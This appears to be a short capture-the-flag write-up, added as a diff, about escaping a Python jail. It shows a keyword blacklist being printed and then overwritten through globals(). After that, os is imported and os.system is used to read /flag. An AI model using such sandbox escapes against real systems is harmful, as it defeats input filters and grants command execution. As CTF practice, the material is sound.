@@ -1,0 +1,19 @@
+Enter command: print(globals())
+{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f2b1af23c10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/random/asdf.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'blacklist': ('eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', ';', '+', 'ord', 'chr', 'base', 'flag', 'replace', ' ', 'decode', 'join'), 'user_input': 'print(globals())'}
+
+
+blacklist: ('eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', ';', '+', 'ord', 'chr', 'base', 'flag', 're    place', ' ', 'decode', 'join')
+
+
+
+Enter command: print(globals())
+{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fce5a933c10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/random/asdf.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'blacklist': ('eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', ';', '+', 'ord', 'chr', 'base', 'flag', 'replace', ' ', 'decode', 'join'), 'user_input': 'print(globals())'}
+Enter command: globals()["blacklist"]=()
+Enter command: os.system("ls")
+Your input sucks :(
+Enter command: import os
+Enter command: os.system("cat /flag")
+SEE{every_ctf_must_have_a_python_jail_challenge_836a4218fb09b4a0ab0412e64de74315}
+
+
+Need to set "blacklist" to a tuple of some sort since the program prob expects and treats "blacklist" as a tuple, so setting "blacklist" to smthg like 0 would bring errors. (Program prob iterates through "blacklist" and checksuser_input)
